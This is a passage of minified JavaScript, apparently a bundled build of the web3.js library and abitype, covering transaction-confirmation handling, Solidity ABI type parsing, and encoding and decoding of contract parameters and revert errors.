        let o = !0,
            s;
        setImmediate(() => {
            var a;
            (a = e.subscriptionManager) === null || a === void 0 || a.subscribe("newHeads").then(l => {
                l.on("data", u => Jy(void 0, void 0, void 0, function*() {
                    var c;
                    if (o = !1, !(u != null && u.number) || s === (u == null ? void 0 : u.parentHash)) return;
                    s = u == null ? void 0 : u.parentHash;
                    const d = BigInt(u.number) - BigInt(t.blockNumber) + BigInt(1);
                    n.emit("confirmation", {
                        confirmations: D({
                            format: "uint"
                        }, d, i),
                        receipt: D(r ?? Gs, t, i),
                        latestBlockHash: D({
                            format: "bytes32"
                        }, u.parentHash, i)
                    }), d >= e.transactionConfirmationBlocks && (yield(c = e.subscriptionManager) === null || c === void 0 ? void 0 : c.removeSubscription(l))
                })), l.on("error", () => Jy(void 0, void 0, void 0, function*() {
                    var u;
                    yield(u = e.subscriptionManager) === null || u === void 0 ? void 0 : u.removeSubscription(l), o = !1, Lc({
                        web3Context: e,
                        transactionReceipt: t,
                        transactionPromiEvent: n,
                        customTransactionReceiptSchema: r,
                        returnFormat: i
                    })
                }))
            }).catch(() => {
                o = !1, Lc({
                    web3Context: e,
                    transactionReceipt: t,
                    customTransactionReceiptSchema: r,
                    transactionPromiEvent: n,
                    returnFormat: i
                })
            })
        }), setTimeout(() => {
            o && Lc({
                web3Context: e,
                transactionReceipt: t,
                transactionPromiEvent: n,
                returnFormat: i
            })
        }, e.blockHeaderTimeout * 1e3)
    };

    function MM(e, t, n, r, i, o) {
        if (N(n) || N(n.blockHash)) throw new lP({
            receipt: n,
            blockHash: D({
                format: "bytes32"
            }, n == null ? void 0 : n.blockHash, i),
            transactionHash: D({
                format: "bytes32"
            }, r, i)
        });
        if (!n.blockNumber) throw new cP({
            receipt: n
        });
        t.emit("confirmation", {
            confirmations: D({
                format: "uint"
            }, 1, i),
            receipt: D(o ?? Gs, n, i),
            latestBlockHash: D({
                format: "bytes32"
            }, n.blockHash, i)
        });
        const s = e.requestManager.provider;
        s && "supportsSubscriptions" in s && s.supportsSubscriptions() ? BM({
            web3Context: e,
            transactionReceipt: n,
            transactionPromiEvent: t,
            customTransactionReceiptSchema: o,
            returnFormat: i
        }) : Lc({
            web3Context: e,
            transactionReceipt: n,
            transactionPromiEvent: t,
            customTransactionReceiptSchema: o,
            returnFormat: i
        })
    }
    const lf = e => !X(e) && typeof e == "object" && !X(e.type) && e.type === "error",
        lg = e => !X(e) && typeof e == "object" && !X(e.type) && e.type === "event",
        cf = e => !X(e) && typeof e == "object" && !X(e.type) && e.type === "function",
        OM = e => !X(e) && typeof e == "object" && !X(e.type) && e.type === "constructor",
        LM = e => typeof e == "object" && typeof e.components > "u" && typeof e.name > "u",
        OA = e => e.includes("[]") ? {
            type: "tuple[]",
            name: e.slice(0, -2)
        } : {
            type: "tuple",
            name: e
        },
        LA = e => {
            const t = [];
            for (const n of Object.keys(e)) {
                const r = e[n];
                typeof r == "object" ? t.push(Object.assign(Object.assign({}, OA(n)), {
                    components: LA(r)
                })) : t.push({
                    name: n,
                    type: e[n]
                })
            }
            return t
        },
        Qp = (e, t) => {
            const n = [];
            return t.forEach(r => {
                if (typeof r.components == "object") {
                    if (!r.type.startsWith("tuple")) throw new fe(`Invalid value given "${r.type}". Error: components found but type is not tuple.`);
                    const i = r.type.indexOf("["),
                        o = i >= 0 ? r.type.substring(i) : "",
                        s = Qp(e, r.components);
                    Array.isArray(s) && e ? n.push(`tuple(${s.join(",")})${o}`) : n.push(`(${s.join(",")})${o}`)
                } else n.push(r.type)
            }), n
        },
        vr = e => {
            var t, n, r, i;
            return lf(e) || lg(e) || cf(e) ? !((t = e.name) === null || t === void 0) && t.includes("(") ? e.name : `${(n=e.name)!==null&&n!==void 0?n:""}(${Qp(!1,(r=e.inputs)!==null&&r!==void 0?r:[]).join(",")})` : `(${Qp(!1,(i=e.inputs)!==null&&i!==void 0?i:[]).join(",")})`
        },
        FM = e => {
            if (typeof e != "string" && !lf(e)) throw new fe("Invalid parameter value in encodeErrorSignature");
            let t;
            return e && (typeof e == "function" || typeof e == "object") ? t = vr(e) : t = e, Yt(t)
        },
        cg = e => {
            if (typeof e != "string" && !lg(e)) throw new fe("Invalid parameter value in encodeEventSignature");
            let t;
            return e && (typeof e == "function" || typeof e == "object") ? t = vr(e) : t = e, Yt(t)
        };

    function ug(e, t) {
        const n = e.exec(t);
        return n == null ? void 0 : n.groups
    }
    var FA = /^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/,
        DA = /^u?int(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/,
        jA = /^\(.+?\).*?$/,
        DM = Object.defineProperty,
        jM = (e, t, n) => t in e ? DM(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: n
        }) : e[t] = n,
        oa = (e, t, n) => (jM(e, typeof t != "symbol" ? t + "" : t, n), n),
        HM = "abitype",
        $M = "0.7.1",
        Bt = class extends Error {
            constructor(e, t = {}) {
                var o;
                const n = t.cause instanceof Bt ? t.cause.details : (o = t.cause) != null && o.message ? t.cause.message : t.details,
                    r = t.cause instanceof Bt && t.cause.docsPath || t.docsPath,
                    i = [e || "An error occurred.", "", ...t.metaMessages ? [...t.metaMessages, ""] : [], ...r ? [`Docs: https://abitype.dev${r}`] : [], ...n ? [`Details: ${n}`] : [], `Version: ${HM}@${$M}`].join(`
`);
                super(i), oa(this, "details"), oa(this, "docsPath"), oa(this, "metaMessages"), oa(this, "shortMessage"), oa(this, "name", "AbiTypeError"), t.cause && (this.cause = t.cause), this.details = n, this.docsPath = r, this.metaMessages = t.metaMessages, this.shortMessage = e
            }
        },
        HA = /^struct (?<name>[a-zA-Z0-9_]+) \{(?<properties>.*?)\}$/;

    function $A(e) {
        return HA.test(e)
    }

    function UM(e) {
        return ug(HA, e)
    }
    var Xy = new Set(["memory", "indexed", "storage", "calldata"]),
        zM = new Set(["calldata", "memory", "storage"]);

    function GM(e, t) {
        return t ? `${t}:${e}` : e
    }
    var dh = new Map([
            ["address", {
                type: "address"
            }],
            ["bool", {
                type: "bool"
            }],
            ["bytes", {
                type: "bytes"
            }],
            ["bytes32", {
                type: "bytes32"
            }],
            ["int", {
                type: "int256"
            }],
            ["int256", {
                type: "int256"
            }],
            ["string", {
                type: "string"
            }],
            ["uint", {
                type: "uint256"
            }],
            ["uint8", {
                type: "uint8"
            }],
            ["uint16", {
                type: "uint16"
            }],
            ["uint24", {
                type: "uint24"
            }],
            ["uint32", {
                type: "uint32"
            }],
            ["uint64", {
                type: "uint64"
            }],
            ["uint96", {
                type: "uint96"
            }],
            ["uint112", {
                type: "uint112"
            }],
            ["uint160", {
                type: "uint160"
            }],
            ["uint192", {
                type: "uint192"
            }],
            ["uint256", {
                type: "uint256"
            }],
            ["address owner", {
                type: "address",
                name: "owner"
            }],
            ["address to", {
                type: "address",
                name: "to"
            }],
            ["bool approved", {
                type: "bool",
                name: "approved"
            }],
            ["bytes _data", {
                type: "bytes",
                name: "_data"
            }],
            ["bytes data", {
                type: "bytes",
                name: "data"
            }],
            ["bytes signature", {
                type: "bytes",
                name: "signature"
            }],
            ["bytes32 hash", {
                type: "bytes32",
                name: "hash"
            }],
            ["bytes32 r", {
                type: "bytes32",
                name: "r"
            }],
            ["bytes32 root", {
                type: "bytes32",
                name: "root"
            }],
            ["bytes32 s", {
                type: "bytes32",
                name: "s"
            }],
            ["string name", {
                type: "string",
                name: "name"
            }],
            ["string symbol", {
                type: "string",
                name: "symbol"
            }],
            ["string tokenURI", {
                type: "string",
                name: "tokenURI"
            }],
            ["uint tokenId", {
                type: "uint256",
                name: "tokenId"
            }],
            ["uint8 v", {
                type: "uint8",
                name: "v"
            }],
            ["uint256 balance", {
                type: "uint256",
                name: "balance"
            }],
            ["uint256 tokenId", {
                type: "uint256",
                name: "tokenId"
            }],
            ["uint256 value", {
                type: "uint256",
                name: "value"
            }],
            ["event:address indexed from", {
                type: "address",
                name: "from",
                indexed: !0
            }],
            ["event:address indexed to", {
                type: "address",
                name: "to",
                indexed: !0
            }],
            ["event:uint indexed tokenId", {
                type: "uint256",
                name: "tokenId",
                indexed: !0
            }],
            ["event:uint256 indexed tokenId", {
                type: "uint256",
                name: "tokenId",
                indexed: !0
            }]
        ]),
        VM = /^(?<type>[a-zA-Z0-9_]+?)(?<array>(?:\[\d*?\])+?)?(?:\s(?<modifier>calldata|indexed|memory|storage{1}))?(?:\s(?<name>[a-zA-Z0-9_]+))?$/,
        WM = /^\((?<type>.+?)\)(?<array>(?:\[\d*?\])+?)?(?:\s(?<modifier>calldata|indexed|memory|storage{1}))?(?:\s(?<name>[a-zA-Z0-9_]+))?$/,
        qM = /^u?int$/;

    function Xu(e, t) {
        var d, f;
        const n = GM(e, t == null ? void 0 : t.type);
        if (dh.has(n)) return dh.get(n);
        const r = jA.test(e),
            i = ug(r ? WM : VM, e);
        if (!i) throw new Bt("Invalid ABI parameter.", {
            details: e
        });
        if (i.name && KM(i.name)) throw new Bt("Invalid ABI parameter.", {
            details: e,
            metaMessages: [`"${i.name}" is a protected Solidity keyword. More info: https://docs.soliditylang.org/en/latest/cheatsheet.html`]
        });
        const o = i.name ? {
                name: i.name
            } : {},
            s = i.modifier === "indexed" ? {
                indexed: !0
            } : {},
            a = (t == null ? void 0 : t.structs) ?? {};
        let l, u = {};
        if (r) {
            l = "tuple";
            const h = Po(i.type),
                v = [],
                p = h.length;
            for (let w = 0; w < p; w++) v.push(Xu(h[w], {
                structs: a
            }));
            u = {
                components: v
            }
        } else if (i.type in a) l = "tuple", u = {
            components: a[i.type]
        };
        else if (qM.test(i.type)) l = `${i.type}256`;
        else if (l = i.type, (t == null ? void 0 : t.type) !== "struct" && !UA(l)) throw new Bt("Unknown type.", {
            metaMessages: [`Type "${l}" is not a valid ABI type.`]
        });
        if (i.modifier) {
            if (!((f = (d = t == null ? void 0 : t.modifiers) == null ? void 0 : d.has) != null && f.call(d, i.modifier))) throw new Bt("Invalid ABI parameter.", {
                details: e,
                metaMessages: [`Modifier "${i.modifier}" not allowed${t!=null&&t.type?` in "${t.type}" type`:""}.`]
            });
            if (zM.has(i.modifier) && !ZM(l, !!i.array)) throw new Bt("Invalid ABI parameter.", {
                details: e,
                metaMessages: [`Modifier "${i.modifier}" not allowed${t!=null&&t.type?` in "${t.type}" type`:""}.`, `Data location can only be specified for array, struct, or mapping types, but "${i.modifier}" was given.`]
            })
        }
        const c = {
            type: `${l}${i.array??""}`,
            ...o,
            ...s,
            ...u
        };
        return dh.set(n, c), c
    }

    function Po(e, t = [], n = "", r = 0) {
        if (e === "") {
            if (n === "") return t;
            if (r !== 0) throw new Bt("Unbalanced parentheses.", {
                metaMessages: [`"${n.trim()}" has too many ${r>0?"opening":"closing"} parentheses.`],
                details: `Depth "${r}"`
            });
            return [...t, n.trim()]
        }
        const i = e.length;
        for (let o = 0; o < i; o++) {
            const s = e[o],
                a = e.slice(o + 1);
            switch (s) {
                case ",":
                    return r === 0 ? Po(a, [...t, n.trim()]) : Po(a, t, `${n}${s}`, r);
                case "(":
                    return Po(a, t, `${n}${s}`, r + 1);
                case ")":
                    return Po(a, t, `${n}${s}`, r - 1);
                default:
                    return Po(a, t, `${n}${s}`, r)
            }
        }
        return []
    }

    function UA(e) {
        return e === "address" || e === "bool" || e === "function" || e === "string" || FA.test(e) || DA.test(e)
    }
    var QM = /^(?:after|alias|anonymous|apply|auto|byte|calldata|case|catch|constant|copyof|default|defined|error|event|external|false|final|function|immutable|implements|in|indexed|inline|internal|let|mapping|match|memory|mutable|null|of|override|partial|private|promise|public|pure|reference|relocatable|return|returns|sizeof|static|storage|struct|super|supports|switch|this|true|try|typedef|typeof|var|view|virtual)$/;

    function KM(e) {
        return e === "address" || e === "bool" || e === "function" || e === "string" || e === "tuple" || FA.test(e) || DA.test(e) || QM.test(e)
    }

    function ZM(e, t) {
        return t || e === "bytes" || e === "string" || e === "tuple"
    }

    function YM(e) {
        const t = {},
            n = e.length;
        for (let s = 0; s < n; s++) {
            const a = e[s];
            if (!$A(a)) continue;
            const l = UM(a);
            if (!l) throw new Bt("Invalid struct signature.", {
                details: a
            });
            const u = l.properties.split(";"),
                c = [],
                d = u.length;
            for (let f = 0; f < d; f++) {
                const v = u[f].trim();
                if (!v) continue;
                const p = Xu(v, {
                    type: "struct"
                });
                c.push(p)
            }
            if (!c.length) throw new Bt("Invalid struct signature.", {
                details: a,
                metaMessages: ["No properties exist."]
            });
            t[l.name] = c
        }
        const r = {},
            i = Object.entries(t),
            o = i.length;
        for (let s = 0; s < o; s++) {
            const [a, l] = i[s];
            r[a] = zA(l, t)
        }
        return r
    }
    var JM = /^(?<type>[a-zA-Z0-9_]+?)(?<array>(?:\[\d*?\])+?)?$/;

    function zA(e, t, n = new Set) {
        const r = [],
            i = e.length;
        for (let o = 0; o < i; o++) {
            const s = e[o];
            if (jA.test(s.type)) r.push(s);
            else {
                const l = ug(JM, s.type);
                if (!(l != null && l.type)) throw new Bt("Invalid ABI parameter.", {
                    details: JSON.stringify(s, null, 2),
                    metaMessages: ["ABI parameter type is invalid."]
                });
                const {
                    array: u,
                    type: c
                } = l;
                if (c in t) {
                    if (n.has(c)) throw new Bt("Circular reference detected.", {
                        metaMessages: [`Struct "${c}" is a circular reference.`]
                    });
                    r.push({ ...s,
                        type: `tuple${u??""}`,
                        components: zA(t[c] ?? [], t, new Set([...n, c]))
                    })
                } else if (UA(c)) r.push(s);
                else throw new Bt("Unknown type.", {
                    metaMessages: [`Type "${c}" is not a valid ABI type. Perhaps you forgot to include a struct signature?`]
                })
            }
        }
        return r
    }

    function XM(e) {
        let t;
        if (typeof e == "string") t = Xu(e, {
            modifiers: Xy
        });
        else {
            const n = YM(e),
                r = e.length;
            for (let i = 0; i < r; i++) {
                const o = e[i];
                if (!$A(o)) {
                    t = Xu(o, {
                        modifiers: Xy,
                        structs: n
                    });
                    break
                }
            }
        }
        if (!t) throw new Bt("Failed to parse ABI parameter.", {
            details: `parseAbiParameter(${JSON.stringify(e,null,2)})`,
            docsPath: "/api/human.html#parseabiparameter-1"
        });
        return t
    }
    const je = 32;

    function Kp(e = 0) {
        var t;
        if (((t = globalThis.Buffer) === null || t === void 0 ? void 0 : t.alloc) !== void 0) {
            const n = globalThis.Buffer.alloc(e);
            return new Uint8Array(n.buffer, n.byteOffset, n.byteLength)
        }
        return new Uint8Array(e)
    }

    function GA(e) {
        var t, n;
        return Object.assign(Object.assign({}, e), {
            name: (t = e.name) !== null && t !== void 0 ? t : "",
            components: (n = e.components) === null || n === void 0 ? void 0 : n.map(r => GA(r))
        })
    }

    function eO(e) {
        return !X(e) && typeof e == "object" && !X(e.type) && typeof e.type == "string"
    }

    function VA(e) {
        return e.map(t => {
            var n;
            if (eO(t)) return t;
            if (typeof t == "string") return GA(XM(t.replace(/tuple/, "")));
            if (LM(t)) {
                const r = Object.keys(t)[0],
                    i = OA(r);
                return i.name = (n = i.name) !== null && n !== void 0 ? n : "", Object.assign(Object.assign({}, i), {
                    components: LA(t[r])
                })
            }
            throw new fe("Invalid abi")
        })
    }

    function dg(e) {
        const t = e.type.lastIndexOf("["),
            n = e.type.substring(0, t),
            r = e.type.substring(t);
        let i = -1;
        if (r !== "[]" && (i = Number(r.slice(1, -1)), isNaN(i))) throw new fe("Invalid fixed array size", {
            size: r
        });
        return {
            param: {
                type: n,
                name: "",
                components: e.components
            },
            size: i
        }
    }

    function ed(e) {
        var t, n;
        return e.type === "string" || e.type === "bytes" || e.type.endsWith("[]") ? !0 : e.type === "tuple" ? (n = (t = e.components) === null || t === void 0 ? void 0 : t.some(ed)) !== null && n !== void 0 ? n : !1 : e.type.endsWith("]") ? ed(dg(e).param) : !1
    }
    const WA = 20,
        qA = je - WA;

    function tO(e, t) {
        if (typeof t != "string") throw new fe("address type expects string as input type", {
            value: t,
            name: e.name,
            type: e.type
        });
        let n = t.toLowerCase();
        if (n.startsWith("0x") || (n = `0x${n}`), !Zt(n)) throw new fe("provided input is not valid address", {
            value: t,
            name: e.name,
            type: e.type
        });
        const r = yo(n),
            i = Kp(je);
        return i.set(r, qA), {
            dynamic: !1,
            encoded: i
        }
    }

    function nO(e, t) {
        const n = t.subarray(qA, je);
        if (n.length !== WA) throw new fe("Invalid decoding input, not enough bytes to decode address", {
            bytes: t
        });
        const r = Tr(n);
        return {
            result: Xn(r),
            encoded: t.subarray(je),
            consumed: je
        }
    }
    const di = new Map;
    let gc = BigInt(256);
    for (let e = 8; e <= 256; e += 8) di.set(`uint${e}`, {
        min: BigInt(0),
        max: gc - BigInt(1)
    }), di.set(`int${e}`, {
        min: -gc / BigInt(2),
        max: gc / BigInt(2) - BigInt(1)
    }), gc *= BigInt(256);
    di.set("int", di.get("int256"));
    di.set("uint", di.get("uint256"));
    const QA = BigInt(1) << BigInt(256);

    function rO(e, t = je) {
        let n;
        return e < 0 ? n = (QA + e).toString(16) : n = e.toString(16), n = bs(n, t * 2), yo(n)
    }

    function iO(e, t) {
        const n = Tr(e),
            r = BigInt(n);
        return r <= t ? r : r - QA
    }

    function Ql(e, t) {
        let n;
        try {
            n = Li(t)
        } catch {
            throw new fe("provided input is not number value", {
                type: e.type,
                value: t,
                name: e.name
            })
        }
        const r = di.get(e.type);
        if (!r) throw new fe("provided abi contains invalid number datatype", {
            type: e.type
        });
        if (n < r.min) throw new fe("provided input is less then minimum for given type", {
            type: e.type,
            value: t,
            name: e.name,
            minimum: r.min.toString()
        });
        if (n > r.max) throw new fe("provided input is greater then maximum for given type", {
            type: e.type,
            value: t,
            name: e.name,
            maximum: r.max.toString()
        });
        return {
            dynamic: !1,
            encoded: rO(n)
        }
    }

    function Is(e, t) {
        if (t.length < je) throw new fe("Not enough bytes left to decode", {
            param: e,
            bytesLeft: t.length
        });
        const n = t.subarray(0, je),
            r = di.get(e.type);
        if (!r) throw new fe("provided abi contains invalid number datatype", {
            type: e.type
        });
        const i = iO(n, r.max);
        if (i < r.min) throw new fe("decoded value is less then minimum for given type", {
            type: e.type,
            value: i,
            name: e.name,
            minimum: r.min.toString()
        });
        if (i > r.max) throw new fe("decoded value is greater then maximum for given type", {
            type: e.type,
            value: i,
            name: e.name,
            maximum: r.max.toString()
        });
        return {
            result: i,
            encoded: t.subarray(je),
            consumed: je
        }
    }

    function oO(e, t) {
        let n;
        try {
            n = AE(t)
        } catch (r) {
            if (r instanceof E0) throw new fe("provided input is not valid boolean value", {
                type: e.type,
                value: t,
                name: e.name
            })
        }
        return Ql({
            type: "uint8",
            name: ""
        }, Number(n))
    }

    function sO(e, t) {
        const n = Is({
            type: "uint8",
            name: ""
        }, t);
        if (n.result > 1 || n.result < 0) throw new fe("Invalid boolean value encoded", {
            boolBytes: t.subarray(0, je),
            numberResult: n
        });
        return {
            result: n.result === BigInt(1),
            encoded: n.encoded,
            consumed: je
        }
    }
    const aO = 32;

    function KA(e, t) {
        if (typeof t == "string" && t.length % 2 !== 0 && (t += "0"), !gi(t)) throw new fe("provided input is not valid bytes value", {
            type: e.type,
            value: t,
            name: e.name
        });
        const n = Zn(t),
            [, r] = e.type.split("bytes");
        if (r) {
            if (Number(r) > aO || Number(r) < 1) throw new fe("invalid bytes type. Static byte type can have between 1 and 32 bytes", {
                type: e.type
            });
            if (Number(r) < n.length) throw new fe("provided input size is different than type size", {
                type: e.type,
                value: t,
                name: e.name
            });
            const s = Kp(je);
            return s.set(n), {
                dynamic: !1,
                encoded: s
            }
        }
        const i = Math.ceil(n.length / je),
            o = Kp(je + i * je);
        return o.set(Ql({
            type: "uint32",
            name: ""
        }, n.length).encoded), o.set(n, je), {
            dynamic: !0,
            encoded: o
        }
    }

    function ZA(e, t) {
        const [, n] = e.type.split("bytes");
        let r = Number(n),
            i = t,
            o = 1,
            s = 0;
        if (!r) {
            const a = Is({
                type: "uint32",
                name: ""
            }, i);
            r = Number(a.result), s += a.consumed, i = a.encoded, o = Math.ceil(r / je)
        }
        if (r > t.length) throw new fe("there is not enough data to decode", {
            type: e.type,
            encoded: t,
            size: r
        });
        return {
            result: ue(i.subarray(0, r)),
            encoded: i.subarray(o * je),
            consumed: s + o * je
        }
    }

    function lO(e, t) {
        if (typeof t != "string") throw new fe("invalid input, should be string", {
            input: t
        });
        const n = B0(t);
        return KA({
            type: "bytes",
            name: ""
        }, n)
    }

    function cO(e, t) {
        const n = ZA({
            type: "bytes",
            name: ""
        }, t);
        return {
            result: Zd(n.result),
            encoded: n.encoded,
            consumed: n.consumed
        }
    }

    function YA(e) {
        let t = 0,
            n = 0;
        const r = [],
            i = [];
        for (const o of e) o.dynamic ? t += je : t += o.encoded.length;
        for (const o of e) o.dynamic ? (r.push(Ql({
            type: "uint256",
            name: ""
        }, t + n)), i.push(o), n += o.encoded.length) : r.push(o);
        return Tt(...r.map(o => o.encoded), ...i.map(o => o.encoded))
    }

    function uO(e, t) {
        if (!Array.isArray(t)) throw new fe("Expected value to be array", {
            abi: e,
            values: t
        });
        const {
            size: n,
            param: r
        } = dg(e), i = t.map(a => Zp(r, a)), o = n === -1, s = i.length > 0 && i[0].dynamic;
        if (!o && t.length !== n) throw new fe("Given arguments count doesn't match array length", {
            arrayLength: n,
            argumentsLength: t.length
        });
        if (o || s) {
            const a = YA(i);
            if (o) {
                const l = Ql({
                    type: "uint256",
                    name: ""
                }, i.length).encoded;
                return {
                    dynamic: !0,
                    encoded: i.length > 0 ? Tt(l, a) : l
                }
            }
            return {
                dynamic: !0,
                encoded: a
            }
        }
        return {
            dynamic: !1,
            encoded: Tt(...i.map(a => a.encoded))
        }
    }

    function dO(e, t) {
        let {
            size: n,
            param: r
        } = dg(e);
        const i = n === -1;
        let o = 0;
        const s = [];
        let a = t;
        if (i) {
            const u = Is({
                type: "uint32",
                name: ""
            }, t);
            n = Number(u.result), o = u.consumed, a = u.encoded
        }
        if (ed(r)) {
            for (let u = 0; u < n; u += 1) {
                const c = Is({
                    type: "uint32",
                    name: ""
                }, a.subarray(u * je));
                o += c.consumed;
                const d = td(r, a.subarray(Number(c.result)));
                o += d.consumed, s.push(d.result)
            }
            return {
                result: s,
                encoded: a.subarray(o),
                consumed: o
            }
        }
        for (let u = 0; u < n; u += 1) {
            const c = td(r, t.subarray(o));
            o += c.consumed, s.push(c.result)
        }
        return {
            result: s,
            encoded: t.subarray(o),
            consumed: o
        }
    }

    function Zp(e, t) {
        if (e.type === "string") return lO(e, t);
        if (e.type === "bool") return oO(e, t);
        if (e.type === "address") return tO(e, t);
        if (e.type === "tuple") return fg(e, t);
        if (e.type.endsWith("]")) return uO(e, t);
        if (e.type.startsWith("bytes")) return KA(e, t);
        if (e.type.startsWith("uint") || e.type.startsWith("int")) return Ql(e, t);
        throw new fe("Unsupported", {
            param: e,
            value: t
        })
    }

    function td(e, t) {
        if (e.type === "string") return cO(e, t);
        if (e.type === "bool") return sO(e, t);
        if (e.type === "address") return nO(e, t);
        if (e.type === "tuple") return JA(e, t);
        if (e.type.endsWith("]")) return dO(e, t);
        if (e.type.startsWith("bytes")) return ZA(e, t);
        if (e.type.startsWith("uint") || e.type.startsWith("int")) return Is(e, t);
        throw new fe("Unsupported", {
            param: e,
            bytes: t
        })
    }

    function fg(e, t) {
        var n, r, i;
        let o = !1;
        if (!Array.isArray(t) && typeof t != "object") throw new fe("param must be either Array or Object", {
            param: e,
            input: t
        });
        const s = t,
            a = [];
        for (let l = 0; l < ((r = (n = e.components) === null || n === void 0 ? void 0 : n.length) !== null && r !== void 0 ? r : 0); l += 1) {
            const u = e.components[l];
            let c;
            if (Array.isArray(s)) {
                if (l >= s.length) throw new fe("input param length missmatch", {
                    param: e,
                    input: t
                });
                c = Zp(u, s[l])
            } else {
                const d = s[(i = u.name) !== null && i !== void 0 ? i : ""];
                if (d == null) throw new fe("missing input defined in abi", {
                    param: e,
                    input: t,
                    paramName: u.name
                });
                c = Zp(u, d)
            }
            c.dynamic && (o = !0), a.push(c)
        }
        return o ? {
            dynamic: !0,
            encoded: YA(a)
        } : {
            dynamic: !1,
            encoded: Tt(...a.map(l => l.encoded))
        }
    }

    function JA(e, t) {
        const n = {
            __length__: 0
        };
        let r = 0;
        if (!e.components) return {
            result: n,
            encoded: t,
            consumed: r
        };
        let i = 0;
        for (const [o, s] of e.components.entries()) {
            let a;
            if (ed(s)) {
                const l = Is({
                    type: "uint32",
                    name: ""
                }, t.subarray(r));
                a = td(s, t.subarray(Number(l.result))), r += l.consumed, i += a.consumed
            } else a = td(s, t.subarray(r)), r += a.consumed;
            n.__length__ += 1, n[o] = a.result, s.name && s.name !== "" && (n[s.name] = a.result)
        }
        return {
            encoded: t.subarray(r + i),
            result: n,
            consumed: r + i
        }
    }

    function fO(e, t, n) {
        const r = VA(e),
            i = yo(t);
        return JA({
            type: "tuple",
            name: "",
            components: r
        }, i).result
    }

    function XA(e) {
        const t = [];
        return e.forEach(n => {
            if (Array.isArray(n)) {
                const r = XA(n);
                t.push({
                    type: "tuple",
                    components: r,
                    name: ""
                })
            } else t.push({
                type: Sr(n, !0)
            })
        }), t
    }

    function uf(e, t) {
        if ((e == null ? void 0 : e.length) !== t.length) throw new fe("Invalid number of values received for given ABI", {
            expected: e == null ? void 0 : e.length,
            received: t.length
        });
        const n = VA(e);
        return Tr(fg({
            type: "tuple",
            name: "",
            components: n
        }, t).encoded)
    }

    function hO(e) {
        try {
            const t = XA(e);
            return Tr(fg({
                type: "tuple",
                name: "",
                components: t
            }, e).encoded)
        } catch {
            throw new fe("Could not infer types from given params", {
                params: e
            })
        }
    }
    const Yp = (e, t) => uf([e], [t]),
        e2 = (e, t, n) => {
            try {
                if (e.length > 0 && (!t || t === "0x" || t === "0X")) throw new fe("Returned values aren't valid, did it run Out of Gas? You might also see this error if you are not using the correct ABI for the contract you are retrieving data from, requesting data from a block number that does not exist, or querying a node which is not fully synced.");
                return fO(e, `0x${t.replace(/0x/i,"")}`, n)
            } catch (r) {
                throw new fe(`Parameter decoding error: ${r.message}`, {
                    internalErr: r
                })
            }
        },
        Qi = (e, t) => e2(e, t, !1),
        t2 = (e, t) => Qi([e], t)[0],
        El = e => {
            if (typeof e != "string" && !cf(e)) throw new fe("Invalid parameter value in encodeFunctionSignature");
            let t;
            return e && (typeof e == "function" || typeof e == "object") ? t = vr(e) : t = e, Yt(t).slice(0, 10)
        },
        pO = (e, t) => {
            var n;
            if (!cf(e)) throw new fe("Invalid parameter value in encodeFunctionCall");
            return `${El(e)}${uf((n=e.inputs)!==null&&n!==void 0?n:[],t??[]).replace("0x","")}`
        },
        Jp = (e, t, n = !0) => {
            const r = n && t && t.length >= 10 && t.startsWith("0x") ? t.slice(10) : t;
            if (!e.inputs) throw new _t("No inputs found in the ABI");
            const i = Qi([...e.inputs], r);
            return Object.assign(Object.assign({}, i), {
                __method__: vr(e)
            })
        },
        mO = (e, t) => {
            if (e.type === "constructor") return t;
            if (!t) return null;
            const n = t.length >= 2 ? t.slice(2) : t;
            if (!e.outputs) return null;
            const r = Qi([...e.outputs], n);
            return r.__length__ === 1 ? r[0] : r
        },
        gO = ["bool", "string", "int", "uint", "address", "fixed", "ufixed"],
        vO = (e, t) => e === "string" ? t : t2(e, t),
        n2 = (e, t, n) => {
            const r = Array.isArray(n) ? n : [n],
                i = {},
                o = {};
            for (const [f, h] of e.entries()) h.indexed ? i[f] = h : o[f] = h;
            const s = t ? e2(Object.values(o), t, !0) : {
                    __length__: 0
                },
                a = r.length - Object.keys(i).length,
                l = Object.values(i).map((f, h) => gO.some(v => f.type.startsWith(v)) ? vO(f.type, r[h + a]) : r[h + a]),
                u = {
                    __length__: 0
                };
            let c = 0,
                d = 0;
            for (const [f, h] of e.entries()) u[f] = h.type === "string" ? "" : void 0, i[f] && (u[f] = l[c], c += 1), o[f] && (u[f] = s[String(d)], d += 1), h.name && (u[h.name] = u[f]), u.__length__ += 1;
            return u
        },
        Fc = (e, t) => {
            if (t != null && t.data) {
                let n, r, i;
                try {
                    const o = t.data.slice(0, 10),
                        s = e.find(a => FM(a).startsWith(o));
                    s != null && s.inputs ? (n = s.name, r = vr(s), i = Qi([...s.inputs], t.data.substring(10))) : t.data.startsWith("0x08c379a0") ? (n = "Error", r = "Error(string)", i = Qi([{
                        name: "message",
                        type: "string"
                    }], t.data.substring(10))) : t.data.startsWith("0x4e487b71") ? (n = "Panic", r = "Panic(uint256)", i = Qi([{
                        name: "code",
                        type: "uint256"
                    }], t.data.substring(10))) : console.error("No matching error abi found for error data", t.data)
                } catch (o) {
                    console.error(o)
                }
                n && t.setDecodedProperties(n, r, i)
            }
        };
    var yO = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const wO = (e, t) => {
        var n, r, i, o, s;
        if (e instanceof Gi && e.cause instanceof $d) {
            if (t !== void 0) {
                const a = t.filter(l => lf(l));
                return Fc(a, e.cause), {
                    reason: e.cause.message,
                    signature: (n = e.cause.data) === null || n === void 0 ? void 0 : n.slice(0, 10),
                    data: (r = e.cause.data) === null || r === void 0 ? void 0 : r.substring(10),
                    customErrorName: e.cause.errorName,
                    customErrorDecodedSignature: e.cause.errorSignature,
                    customErrorArguments: e.cause.errorArgs
                }
            }
            return {
                reason: e.cause.message,
                signature: (i = e.cause.data) === null || i === void 0 ? void 0 : i.slice(0, 10),
                data: (o = e.cause.data) === null || o === void 0 ? void 0 : o.substring(10)
            }
        }
